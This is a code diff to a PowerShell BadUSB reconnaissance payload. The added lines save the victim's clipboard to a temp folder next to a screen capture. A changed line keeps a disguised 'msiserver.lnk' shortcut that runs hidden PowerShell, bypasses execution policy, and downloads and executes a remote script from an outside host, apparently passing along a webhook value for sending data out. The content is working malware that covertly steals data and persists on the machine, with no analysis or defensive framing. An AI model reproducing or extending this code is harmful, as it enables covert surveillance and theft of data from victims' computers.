@@ -644,6 +644,9 @@ function Get-ScreenCapture
 
 $ss = Get-ScreenCapture
 
+# Get Clipboard
+Get-Clipboard > "$env:temp\$FolderName\Clipboard.txt";
+
 # Clear clipboard of image
 Set-Clipboard -Value $null
 
@@ -705,7 +708,7 @@ if(![System.IO.File]::Exists($env:USERPROFILE+"\msiserver.lnk")){
     $objShell = New-Object -COM WScript.Shell
 	$objShortCut = $objShell.CreateShortcut($env:USERPROFILE + "\msiserver.lnk")
 	$target = "powershell"
-	$args = "-w h -ep bypass -command `"`$dc='"+$dc+"';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
+	$args = "-Nop -Noni -w h -ep bypass -command `"`$dc='"+$dc+"';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex`""
 	$objShortCut.TargetPath = $target
 	$objShortcut.Arguments = $args
 	$objShortCut.Save()
